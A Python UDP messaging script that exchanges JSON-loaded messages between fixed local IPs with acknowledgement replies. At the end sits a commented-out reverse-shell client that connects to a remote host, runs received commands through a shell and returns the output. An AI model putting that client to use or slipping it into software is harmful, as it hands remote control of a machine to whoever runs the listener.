import socket
import json

def Main():

    with open('messages_generated.json') as json_file:
        messages = json.load(json_file)

    for i in range(len(messages)):
        messages[i]["from_ip"] = tuple(messages[i]["from_ip"])
        messages[i]["to_ip"] = tuple(messages[i]["to_ip"])

    print(messages)
    
    host='192.168.43.53' #client ip
    port = 4005
    me_ip = (host, port)
    username = "ritik"

    # server = ('192.168.43.53', 4000)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((host,port))
    # s.settimeout(5)

    print("ME : "+str(me_ip)+" "+username)

    for message in messages:
        # print(message["from_ip"],me_ip, message["from_ip"]==me_ip)
        if message["to_ip"]==me_ip:
            while True:
                data, addr = s.recvfrom(1024)
                data = data.decode('utf-8')

                if message["from_ip"]==addr:
                    print("Message from: " + str(addr))
                    print("From connected user: " + data)
                    data = "TRUE"
                    print("Sending: " + data)
                    s.sendto(data.encode('utf-8'), addr)
                    break
                else:
                    # print("Message from: " + str(addr))
                    # print("From connected user: " + data)
                    data = "FALSE"
                    # print("Sending: " + data)
                    s.sendto(data.encode('utf-8'), addr)
        if message["from_ip"]==me_ip:
            while True:
                a = s.sendto(message["message"].encode('utf-8'), message["to_ip"])
                # print(a)
                # print("Sent "+str(message["message"])+" to "+str(message["to_ip"])+" " +str(message["to_username"]))
                s.settimeout(5)
                try:
                    data, addr = s.recvfrom(1024)
                except:
                    # print("Timeout!!! Try again...")
                    continue
                # data, addr = s.recvfrom(1024)
                data = data.decode('utf-8')
                # print("Received from "+str(message["to_ip"])+" "+str(message["to_username"]) + ": " + data)
                if data=="TRUE":
                    s.settimeout(None)
                    print("Sent "+str(message["message"])+" to "+str(message["to_ip"])+" " +str(message["to_username"]))
                    print("Received from "+str(message["to_ip"])+" "+str(message["to_username"]) + ": " + data)
                    break

if __name__=='__main__':
    Main()


# import socket
# import os
# import subprocess

# s = socket.socket()
# # host = '104.236.209.167'
# host = '127.0.0.1'
# port = 9999

# s.connect((host, port))

# while True:
#     data = s.recv(1024)
#     if data[:2].decode("utf-8") == 'cd':
#         os.chdir(data[3:].decode("utf-8"))

#     if len(data) > 0:
#         cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
#         output_byte = cmd.stdout.read() + cmd.stderr.read()
#         output_str = str(output_byte,"utf-8")
#         currentWD = os.getcwd() + "> "
#         s.send(str.encode(output_str + currentWD))

#         print(output_str)